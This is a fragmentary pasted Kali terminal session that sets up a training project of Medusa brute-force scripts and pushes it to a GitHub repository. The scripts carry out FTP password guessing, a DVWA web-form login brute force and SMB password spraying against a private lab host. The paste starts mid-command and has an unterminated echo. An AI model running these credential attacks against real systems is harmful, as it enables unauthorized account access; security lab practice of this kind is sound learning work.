──(kali㉿kali)-[~/brute-force-medusa]
└─$ >....                                                                                                                                                                                                                                   
admin
msfadmin
EOF

##############################
# Scripts
##############################
┌──(kali㉿kali)-[~/brute-force-medusa]
└─$ >....                                                                                        
cat << 'EOF' > scripts/script-ftp-bruteforce.sh        
#!/bin/bash
medusa -h 192.168.56.20 -u msfadmin -P ../wordlists/passwords.txt -M ftp | tee ../ftp_result.txt
EOF                                            

cat << 'EOF' > scripts/script-dvwa-bruteforce.sh                                                
#!/bin/bash
medusa -h 192.168.56.20 -M web-form \
-U ../wordlists/users.txt -P ../wordlists/passwords.txt \
-m FORM:"/dvwa/login.php":user:pass:"Login failed" \
| tee ../dvwa_result.txt             
EOF                                                      

cat << 'EOF' > scripts/script-smb-spraying.sh
#!/bin/bash
medusa -h 192.168.56.20 -U ../wordlists/users.txt -p msfadmin -M smbnt | tee ../smb_result.txt
EOF                                          

chmod +x scripts/*.sh                                                                         

##############################
# Criar ZIP final    
##############################
cd ..            
zip -r brute-force-medusa.zip brute-force-medusa

##############################                  
# Inicializar repositório Git
##############################
cd brute-force-medusa        
git init                      
git add .            
git commit -m "Initial commit: brute force project with medusa"

echo "===================================================="    
echo " ✔ Projeto criado com sucesso!"
echo " ✔ Repositório Git inicial                           
brute-force-medusa                   
git remote add origin https://github.com/MFSS25/brute-force-medusa.git
git branch -M main
git push -u origin main

